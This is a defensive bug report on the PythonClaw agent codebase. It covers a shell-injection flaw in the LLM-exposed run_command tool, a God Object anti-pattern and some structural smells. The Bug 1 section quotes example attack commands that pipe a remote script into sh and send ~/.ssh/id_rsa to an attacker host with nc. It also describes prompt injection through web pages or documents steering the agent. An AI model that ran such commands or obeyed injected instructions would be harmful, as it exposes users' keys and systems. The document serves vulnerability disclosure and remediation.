# Bug Report — Bugs in the Real PythonClaw Codebase

> **Brief §3 deliverable.** Bugs found in the **real PythonClaw** source
> ([github.com/ericwang915/PythonClaw](https://github.com/ericwang915/PythonClaw),
> the Python port of OpenClaw, PyPI `pythonclaw`), pinned at commit `7787bb43`
> (v0.6.6) — **not** a stand-in. Reproduce the structural analysis with:
>
> ```bash
> uv run python scripts/fetch_pythonclaw.py        # clone at pinned SHA
> uv run python scripts/analyze_real_pythonclaw.py # → results/data/real_pythonclaw_analysis.json
> ```
>
> **Honesty note.** GRAPHIFY's dependency-graph reverse engineering surfaces
> *candidate* hotspots (large/over-connected modules). Following those leads into
> the actual code then separates **genuine defects** from mere **smells**. Bug 1
> below is a real, exploitable **security defect**; Bug 2 is a real architectural
> **anti-pattern**; §3 lists the structural smells honestly labelled as smells
> (not functional bugs). PythonClaw has **no** import cycles and **no** dead code —
> it is structurally sound apart from these.

---

## Bug 1 (REAL — security / RCE): command injection in the agent's `run_command` tool

- **Severity**: CRITICAL — arbitrary command execution on the host via the LLM.
- **Type**: CWE-78 (OS Command Injection). A *functional* bug, not a smell.

- **Finding.** `pythonclaw/core/tools.py` exposes `run_command(command: str)` as a
  **PRIMITIVE_TOOL that is always available to the LLM** (registered in the tool
  dispatch table and advertised to the model with the schema
  `{"command": {"type": "string", "description": "The shell command to execute."}}`).
  Its body runs the model-supplied string straight through the shell:

  ```python
  # pythonclaw/core/tools.py  (run_command)
  result = subprocess.run(
      command, shell=True, capture_output=True, text=True,
      timeout=60, env=_venv_env(), cwd=_files_dir(),
  )
  ```

- **Why it is a real bug (not a smell).**
  - `shell=True` on an **LLM-controlled** string means any text the model emits —
    or any text injected into the model via **prompt injection** (a malicious web
    page the agent summarises, a poisoned document, a crafted chat message) —
    executes as a shell command: `run_command("curl evil.sh | sh")`,
    `run_command("cat ~/.ssh/id_rsa | nc attacker 443")`, etc.
  - The author **clearly knows how to sandbox** — the *same file* carefully
    guards file operations: `_sanitize_filename()` strips `..` and path
    separators, `_sandbox_roots` confines reads/writes, and `write_file` is
    "restricted to sandbox directories." **`run_command` has none of that** —
    no allow-list, no shell-escaping, no sandbox. Setting `cwd` to a files dir is
    no protection: `shell=True` lets the command `cd` elsewhere, chain with
    `;`/`&&`, and reach the whole filesystem with the user's privileges.
  - Contrast the bundled `dev/code_runner` skill, which does it **correctly** —
    `subprocess.run([python, tmp_path], ...)` (argument list, **no shell**),
    isolated temp file, timeout. The primitive `run_command` is the inconsistent,
    vulnerable path.

- **How reverse engineering exposed it.** GRAPHIFY flags `core/tools.py` as a
  high-fan-in hub (the agent's tool surface, fan-in 5); reading the tool it
  exposes reveals the `shell=True` sink. The graph pointed at the file; the code
  review found the defect.

- **Fix.** Drop `shell=True` and pass an argument vector
  (`shlex.split` + `subprocess.run(args, shell=False)`), or gate `run_command`
  behind an explicit allow-list / human-confirmation, mirroring the sandboxing the
  file tools already use.

- **Evidence**: `vendor/pythonclaw/pythonclaw/core/tools.py` — `run_command`
  (~line 142), tool registration (~line 236), exposed schema (~line 270),
  "PRIMITIVE_TOOLS … always available" (module docstring).

---

## Bug 2 (architectural anti-pattern): God Object — `core/agent.py` (`Agent`)

- **Severity**: HIGH (maintainability) — the module the whole platform hinges on
  is unmaintainable and untestable in isolation.

- **Finding.** `pythonclaw/core/agent.py` is **1,151 lines** — the largest module
  by far. Its `Agent` class wires **27 instance collaborators** (`self.X = …`
  assignments) in a single `__init__` (LLM clients, memory, session store, tools,
  skill loader, RAG retriever, compaction, …); `chat_stream`/`chat` are the
  largest methods in the whole graph (fan-out 25/22). It carries both high
  afferent (fan-in 5) and efferent (fan-out 7) module coupling.

- **Why it is a real anti-pattern.** This is the classic **God Object** (Brown et
  al., *AntiPatterns*): one class owns orchestration, state, IO, and policy. It
  violates Single-Responsibility and Dependency-Inversion — it cannot be unit
  tested without standing up the entire stack, and every cross-cutting change
  touches it. (It is a *design* defect, not a crash — stated honestly.)

- **How reverse engineering exposed it.** It is the single highest-fan-out node in
  the GRAPHIFY graph and the largest module — the textbook signature a
  dependency-graph analysis surfaces.

- **Fix.** Extract collaborators behind interfaces and inject them — split `Agent`
  into a thin orchestrator + `ChatSession` / `MemoryGateway` / `SkillDispatcher`,
  dropping `__init__` wiring to single digits.

---

## 3. Supporting structural smells (honestly: smells, not functional bugs)

These came out of the GRAPHIFY analysis (`results/data/real_pythonclaw_analysis.json`).
They are real *maintainability* signals, **not** defects — listed for completeness,
not claimed as bugs:

- **Coupling hotspot — `core/llm/base.py`, fan-in 13.** The most-depended module.
  But **3 of the 13** are the LLM clients correctly *implementing* the base
  interface (healthy DIP), and **5 more** are `TYPE_CHECKING`-only imports — so the
  effective runtime coupling is ~5 modules. A watch-item, not a bug.
- **Oversized modules.** 22 of 72 modules exceed 150 LOC (`web/app.py` 733,
  `core/tools.py` 582, `main.py` 409 …). This is *our* course's file-size rule, not
  a PythonClaw defect — included only as a refactoring target for the RL agent's
  ΔModularity/ΔCohesion reward.

---

## Appendix — Engineering defects found & fixed in our own RL training pipeline

> Not PythonClaw bugs — defects in *our* harness, fixed during the build.
- **A1 — `Categorical(logits=all_-inf)` NaN on all-False action mask.** Fixed
  `5dd14ca` (NOOP-pin); test `test_policy_net_categorical_safe.py`.
- **A2 — Louvain wedge on degenerate topologies.** Fixed RC-4 (SIGALRM 1-s cut +
  stored masks); tests `test_modularity_wedge_regression.py`, `test_modularity_watchdog.py`.

## Cross-references
- Reproduction: `scripts/fetch_pythonclaw.py`, `scripts/analyze_real_pythonclaw.py`
- Structural evidence: `results/data/real_pythonclaw_analysis.json`, `results/graphify_output.gpickle`
- Source decision: `docs/adr/ADR-001-pythonclaw-shim-boundary.md`
